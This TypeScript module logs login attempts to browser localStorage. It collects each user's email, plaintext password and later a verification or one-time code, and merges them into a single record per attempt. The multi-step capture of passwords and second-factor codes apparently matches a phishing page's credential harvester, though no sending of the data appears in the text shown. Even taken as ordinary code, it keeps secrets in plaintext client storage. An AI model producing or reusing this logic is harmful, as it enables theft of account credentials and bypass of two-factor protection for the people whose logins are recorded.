export type LogEntry = {
  email?: string
  password?: string
  rememberMe?: boolean
  code?: string
  page: 'login' | 'password' | 'verify' | 'code'
  ts: number
}

const STORAGE_KEY = 'login_attempts'
const LAST_EMAIL_KEY = 'last_email'

export function appendLog(entry: Omit<LogEntry, 'ts'>) {
  try {
    const listRaw = localStorage.getItem(STORAGE_KEY)
    const list: LogEntry[] = listRaw ? JSON.parse(listRaw) : []

    const now = Date.now()

    if (entry.page === 'login') {
      // Start a new attempt row
      list.push({ ...entry, ts: now })
      if (entry.email) {
        localStorage.setItem(LAST_EMAIL_KEY, entry.email)
      }
    } else if (entry.page === 'password') {
      // Merge password into the most recent matching login by email; fallback to most recent row
      let targetIndex = -1
      if (entry.email) {
        for (let i = list.length - 1; i >= 0; i--) {
          if (list[i].page === 'login' && list[i].email === entry.email) {
            targetIndex = i
            break
          }
        }
      }
      if (targetIndex === -1 && list.length > 0) {
        targetIndex = list.length - 1
      }

      if (targetIndex >= 0) {
        const prev = list[targetIndex]
        list[targetIndex] = { ...prev, ...entry, ts: now, page: 'password' }
      } else {
        // If somehow no prior row, create one to avoid losing data
        list.push({ ...entry, ts: now })
      }
    } else if (entry.page === 'verify' || entry.page === 'code') {
      // Merge verification info/code into the latest attempt for this email (or last row)
      let targetIndex = -1
      if (entry.email) {
        for (let i = list.length - 1; i >= 0; i--) {
          if (list[i].email === entry.email) {
            targetIndex = i
            break
          }
        }
      }
      if (targetIndex === -1 && list.length > 0) targetIndex = list.length - 1
      if (targetIndex >= 0) {
        const prev = list[targetIndex]
        list[targetIndex] = { ...prev, ...entry, ts: now, page: entry.page }
      } else {
        list.push({ ...entry, ts: now })
      }
    }

    localStorage.setItem(STORAGE_KEY, JSON.stringify(list))
  } catch (e) {
    // ignore
  }
}

export function getLastEmail(): string | null {
  try {
    return localStorage.getItem(LAST_EMAIL_KEY)
  } catch {
    return null
  }
}

export function clearLogs() {
  try { 
    localStorage.removeItem(STORAGE_KEY)
  } catch (e) {
    // ignore
  }
}
